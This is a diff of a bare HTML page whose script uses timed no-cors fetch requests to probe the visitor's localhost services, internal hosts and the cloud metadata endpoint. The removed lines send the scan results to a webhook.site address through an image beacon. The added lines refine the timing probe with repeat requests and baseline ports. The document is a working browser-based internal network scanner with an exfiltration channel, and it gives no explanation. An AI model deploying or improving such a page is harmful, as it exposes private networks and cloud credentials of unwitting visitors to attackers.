@@ -1,17 +1,19 @@
-<html><head><title>lb</title></head><body><div id=o>pending</div>
+<html><head><title>diff</title></head><body><div id=o>pending</div>
 <script>
 (async () => {
-  const targets = ['http://127.0.0.1:8000/health','http://127.0.0.1:8200/v1/sys/health','http://127.0.0.1:3000/','http://127.0.0.1:9090/-/healthy','http://169.254.169.254/latest/meta-data/','http://127.0.0.1:80/','http://127.0.0.1:5432/','http://127.0.0.1:6379/'];
+  const targets = ['http://127.0.0.1:1/','http://127.0.0.1:9/','http://127.0.0.1:65534/','http://127.0.0.1:8000/health','http://127.0.0.1:8200/v1/sys/health','http://169.254.169.254/latest/meta-data/','http://10.255.255.1/'];
   const out = [];
   for (const u of targets) {
-    const t0 = performance.now();
-    try {
-      const c = new AbortController(); setTimeout(()=>c.abort(), 3500);
-      const r = await fetch(u, {mode:'no-cors', signal:c.signal});
-      out.push(u+' TYPE='+r.type+' ST='+r.status+' MS='+Math.round(performance.now()-t0));
-    } catch (e) { out.push(u+' ERR='+e.name+' MS='+Math.round(performance.now()-t0)); }
+    let line = u;
+    for (let i=0;i<2;i++){
+      const t0 = performance.now();
+      try { const c=new AbortController(); setTimeout(()=>c.abort(),4000);
+            const r = await fetch(u,{mode:'no-cors',cache:'no-store',signal:c.signal});
+            line += ' ['+r.type+'/'+r.status+'/'+Math.round(performance.now()-t0)+'ms]';
+      } catch(e){ line += ' ['+e.name+'/'+Math.round(performance.now()-t0)+'ms]'; }
+    }
+    out.push(line);
   }
-  document.getElementById('o').textContent = out.join(' || ');
-  new Image().src='https://webhook.site/588edc57-c718-4347-a136-95b1c47568a2/?r='+encodeURIComponent(out.join(' || '));
+  document.getElementById('o').textContent = out.join(' ## ');
 })();
 </script></body></html>
